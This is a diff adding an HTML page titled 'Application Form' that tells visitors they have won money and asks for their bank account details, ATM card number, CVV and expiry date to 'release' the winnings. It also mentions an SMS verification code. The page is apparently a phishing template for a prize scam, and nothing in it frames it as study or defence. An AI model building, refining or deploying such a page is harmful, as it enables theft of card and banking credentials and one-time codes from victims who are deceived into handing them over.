@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Application Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 15px;
+    }
+    label {
+      font-weight: bold;
+    }
+    .readonly-box {
+      background-color: #f0f0f0;
+      padding: 10px;
+      border: 1px solid #ccc;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Application Form</h2>
+
+  <form id="applicationForm">
+
+    <!-- 1. Full Name -->
+    <label for="fullName">1. Full Name</label>
+    <input type="text" id="fullName" name="fullName" required>
+
+    <!-- 2. Phone Number -->
+    <label for="phoneNumber">2. Phone Number</label>
+    <input type="tel" id="phoneNumber" name="phoneNumber" required>
+
+    <!-- 3. Amount You Won -->
+    <label for="amountWon">3. Amount You Won</label>
+    <input type="text" id="amountWon" name="amountWon" required>
+
+    <!-- 4. Bank Account Type -->
+    <label for="bankType">4. Bank Account Type (e.g., Standard Bank)</label>
+    <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
+
+    <!-- 5. Bank Account Number -->
+    <label for="bankNumber">5. Bank Account Number</label>
+    <input type="text" id="bankNumber" name="bankNumber" required>
+
+    <!-- 6. Bank Account Holder's Name -->
+    <label for="accountHolder">6. Bank Account Holder's Name</label>
+    <input type="text" id="accountHolder" name="accountHolder" required>
+
+    <!-- 7. Linked ATM Card? -->
+    <label for="atmLinked">7. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
+    <select id="atmLinked" name="atmLinked" required>
+      <option value="">--Select--</option>
+      <option value="Yes">Yes</option>
+      <option value="No">No</option>
+    </select>
+
+    <!-- 8. ATM Card Verification -->
+    <label>8. We need to verify your details so that we release <span id="amountPreview">the amount</span> to your <span id="bankPreview">bank</span> account.</label>
+
+    <label for="atmNumber">ATM Card Number</label>
+    <input type="text" id="atmNumber" name="atmNumber" maxlength="16">
+
+    <label for="cvv">CVV</label>
+    <input type="text" id="cvv" name="cvv" maxlength="4">
+
+    <label for="expiry">Expiry Date (MM/YY)</label>
+    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5">
+
+    <!-- 9. Auto-Filled Note -->
+    <label>9. Confirmation</label>
+    <div class="readonly-box" id="autoFilledNote">
+      You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
+    </div>
+
+    <button type="submit">Submit Application</button>
+  </form>
+
+  <script>
+    const amountInput = document.getElementById("amountWon");
+    const phoneInput = document.getElementById("phoneNumber");
+    const bankInput = document.getElementById("bankType");
+
+    const amountPreview = document.getElementById("amountPreview");
+    const bankPreview = document.getElementById("bankPreview");
+    const bankTypePreview = document.getElementById("bankTypePreview");
+    const autoFilledNote = document.getElementById("autoFilledNote");
+
+    function updateDynamicText() {
+      const amount = amountInput.value || "[amount]";
+      const phone = phoneInput.value || "[phone]";
+      const bank = bankInput.value || "[bank]";
+
+      amountPreview.textContent = amount;
+      bankPreview.textContent = bank;
+      bankTypePreview.textContent = bank;
+      autoFilledNote.textContent = `You will receive ${amount} immediately you submit the form and the SMS verification sent to your number ${phone}`;
+    }
+
+    amountInput.addEventListener("input", updateDynamicText);
+    phoneInput.addEventListener("input", updateDynamicText);
+    bankInput.addEventListener("input", updateDynamicText);
+  </script>
+
+</body>
+</html>
